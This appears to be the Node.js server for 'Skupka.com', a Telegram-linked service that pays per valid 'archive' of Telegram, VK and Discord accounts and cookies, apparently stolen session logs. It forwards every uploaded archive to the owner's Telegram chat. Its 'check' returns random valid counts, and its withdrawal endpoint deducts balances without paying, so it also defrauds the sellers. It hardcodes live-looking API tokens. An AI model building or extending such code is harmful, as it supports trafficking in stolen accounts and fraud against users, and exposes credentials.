const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const multer = require('multer');
const FormData = require('form-data');

const app = express();
app.use(express.json({ verify: (req, res, buf) => { req.rawBody = buf.toString(); } }));
app.use(cors());

// === НАСТРОЙКИ ===
const CRYPTOBOT_API_TOKEN = '613177:AAnXuVFE03h7YQGq4NrKRhLIk9I4my6Nms5'; // Токен CryptoBot
const TELEGRAM_BOT_TOKEN = '8819928038:AAG_0MiOZbybxyo0TFx6b3Qctkn9fNQDthE';       // Токен вашего TG бота
const OWNER_CHAT_ID = '1114315520';                      // Ваш ID в Telegram (куда слать файлы)
const CRYPTOBOT_API_URL = 'https://pay.crypt.bot/api/';

const PRICES = { telegram: 50, vk: 30, discord: 10, cookie: 1 };

const db = {
    users: {},
    getUser(tg_id, name) {
        if (!this.users[tg_id]) {
            this.users[tg_id] = {
                name: name || 'User', balance: 0, archives_sold: 0, total_payout: 0,
                history: [], reg_date: new Date().toLocaleDateString('ru-RU')
            };
        }
        return this.users[tg_id];
    }
};

// Настройка Multer для приема файлов в память
const upload = multer({ storage: multer.memoryStorage() });

async function cryptoBotRequest(method, params = {}) {
    try {
        const response = await axios.post(CRYPTOBOT_API_URL + method, params, {
            headers: { 'Crypto-Pay-API-Token': CRYPTOBOT_API_TOKEN }
        });
        return response.data;
    } catch (error) { throw error; }
}

// 1. Получить данные пользователя
app.get('/api/getMe', (req, res) => {
    const tg_id = req.query.tg_id;
    const name = req.query.name;
    const user = db.getUser(tg_id, name);
    res.json({ success: true, user });
});

// 2. ЗАГРУЗКА АРХИВА И ПЕРЕСЫЛКА ВЛАДЕЛЬЦУ
app.post('/api/upload', upload.single('file'), async (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'Файл не найден' });
        
        const { tg_id, category, username } = req.body;
        const fileBuffer = req.file.buffer;
        const fileName = req.file.originalname;
        
        // Формируем описание к файлу
        const caption = `📦 Новый архив от пользователя!\nID: ${tg_id}\nUsername: @${username || 'нет'}\nКатегория: ${category}\nФайл: ${fileName}`;

        // Отправляем файл ВЛАДЕЛЬЦУ (вам)
        const formData = new FormData();
        formData.append('chat_id', OWNER_CHAT_ID);
        formData.append('document', fileBuffer, fileName);
        formData.append('caption', caption);

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, formData, {
            headers: formData.getHeaders()
        });

        // Симуляция проверки (генерируем случайное количество валидных)
        const valid = Math.floor(Math.random() * 5) + 1;
        const invalid = Math.floor(Math.random() * 3);

        res.json({ success: true, valid, invalid });
    } catch (error) {
        console.error('Upload error:', error.message);
        res.status(500).json({ error: 'Ошибка загрузки' });
    }
});

// 3. Подтверждение продажи (начисление баланса)
app.post('/api/sell', (req, res) => {
    const { tg_id, category, valid_count } = req.body;
    const user = db.getUser(tg_id);
    const price = PRICES[category] || 0;
    const payout = price * valid_count;

    user.balance += payout;
    user.archives_sold += 1;
    user.total_payout += payout;
    user.history.unshift({ type: 'deposit', amount: payout, date: new Date().toLocaleDateString('ru-RU'), status: 'Выполнено' });

    res.json({ success: true, payout, balance: user.balance });
});

// 4. Пополнение
app.post('/api/deposit', async (req, res) => {
    const { tg_id, asset, amount } = req.body;
    try {
        const cryptoResponse = await cryptoBotRequest('createInvoice', {
            asset: asset, amount: amount,
            description: `Пополнение баланса Skupka.com (${asset})`,
            payload: JSON.stringify({ action: 'deposit', tg_id: tg_id }),
            expires_in: 3600 
        });
        if (cryptoResponse.ok) {
            res.json({ success: true, pay_url: cryptoResponse.result.bot_invoice_url });
        } else { res.status(400).json({ error: 'Не удалось создать счет' }); }
    } catch (error) { res.status(500).json({ error: 'Ошибка сервера' }); }
});

// 5. Вывод средств
app.post('/api/withdraw', async (req, res) => {
    const { tg_id, asset, amount, address } = req.body;
    const user = db.getUser(tg_id);
    if (user.balance < amount) return res.status(400).json({ error: 'Недостаточно средств' });

    user.balance -= amount;
    user.history.unshift({ type: 'withdraw', amount: amount, date: new Date().toLocaleDateString('ru-RU'), status: 'В обработке' });
    res.json({ success: true, balance: user.balance });
});

// 6. Вебхук
app.post('/api/webhook', (req, res) => {
    const secret = crypto.createHash('sha256').update(CRYPTOBOT_API_TOKEN).digest();
    const hmac = crypto.createHmac('sha256', secret).update(req.rawBody).digest('hex');
    if (hmac !== req.headers['crypto-pay-api-signature']) return res.status(401).send('Unauthorized');

    const update = req.body;
    if (update.update_type === 'invoice_paid') {
        const payload = JSON.parse(update.payload.invoice.payload);
        const tg_id = payload.tg_id;
        const amount = parseFloat(update.payload.invoice.amount);
        const user = db.getUser(tg_id);
        user.balance += amount;
        user.history.unshift({ type: 'deposit', amount: amount, date: new Date().toLocaleDateString('ru-RU'), status: 'Выполнено' });
    }
    res.send('OK');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Сервер Skupka запущен на порту ${PORT}`));
